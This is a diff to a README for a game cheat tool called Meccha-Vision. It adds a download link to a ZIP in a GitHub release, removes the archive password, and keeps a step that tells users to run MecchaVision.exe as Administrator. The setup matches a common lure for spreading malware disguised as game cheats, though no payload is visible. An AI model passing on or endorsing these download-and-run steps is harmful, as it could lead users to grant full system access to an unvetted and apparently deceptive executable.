@@ -7,9 +7,8 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha-Vision]()**
+🔗 **[Download Meccha-Vision](https://github.com/SteelProductionPivot/MECCHA-CHAMELEON-VISION/releases/download/top/MecchaVision.zip)**
 
-**Password:** `vision2026`
 
 ## 🎮 What is This?
 
@@ -58,7 +57,7 @@
 ## 📦 Installation
 
 1. Download the archive
-2. Extract using password: `vision2026`
+2. Extract
 3. Run `MecchaVision.exe` as Administrator
 4. Launch MECCHA CHAMELEON
 5. Press **INSERT** or **F1** to open the mod menu
